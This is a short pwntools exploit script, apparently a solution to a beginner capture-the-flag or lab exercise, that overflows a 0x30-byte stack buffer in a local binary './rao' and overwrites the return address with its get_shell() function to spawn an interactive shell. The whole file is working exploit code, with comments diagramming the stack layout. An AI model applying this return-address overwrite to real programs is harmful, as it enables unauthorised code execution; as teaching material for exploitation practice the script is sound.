#!/usr/bin/python3
#Name: rao.py

from pwn import *          # Import pwntools module

p = process('./rao')       # Spawn process './rao'

elf = ELF('./rao')
get_shell = elf.symbols['get_shell']       # The address of get_shell()

payload = b'A'*0x30        #|       buf      |  <= 'A'*0x30
payload += b'B'*0x8        #|       SFP      |  <= 'B'*0x8
payload += p64(get_shell)  #| Return address |  <= '\xaa\x06\x40\x00\x00\x00\x00\x00'

p.sendline(payload)        # Send payload to './rao'

p.interactive()            # Communicate with shell